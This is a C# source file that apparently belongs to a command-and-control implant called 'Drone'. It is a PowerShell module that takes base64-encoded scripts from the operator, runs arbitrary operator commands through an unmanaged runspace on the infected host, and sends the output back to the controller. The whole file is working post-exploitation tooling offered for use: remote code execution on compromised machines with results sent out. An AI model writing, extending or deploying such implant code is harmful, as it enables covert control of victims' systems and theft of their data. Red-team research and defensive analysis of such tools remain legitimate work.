﻿using System.Text;

using Drone.Models;
using Drone.Modules;

namespace PowerShellModule;

public class PowerShellModule : DroneModule
{
    public override string Name => "powershell";

    public override List<Command> Commands => new()
    {
        new Command("powershell-import", "Import a PowerShell script", PowerShellImport,
            new List<Command.Argument>
            {
                new("/path/to/script.ps1", false, true)
            }),
        new Command("powershell", "Execute PowerShell via an unmanaged runspace", PowerShellExecute,
            new List<Command.Argument>
            {
                new("command", false)

            }, hookable: true)
    };
    
    private string _imported = "";
    
    private void PowerShellImport(DroneTask task, CancellationToken token)
    {
        var script = Convert.FromBase64String(task.Artefact);
        _imported = Encoding.UTF8.GetString(script);
    }
    
    private void PowerShellExecute(DroneTask task, CancellationToken token)
    {
        using var runner = new PowerShellRunner();
            
        if (!string.IsNullOrEmpty(_imported))
            runner.ImportScript(_imported);

        var command = string.Join(" ", task.Arguments);
        var result = runner.Invoke(command);
            
        Drone.SendResult(task.TaskGuid, result);
    }
}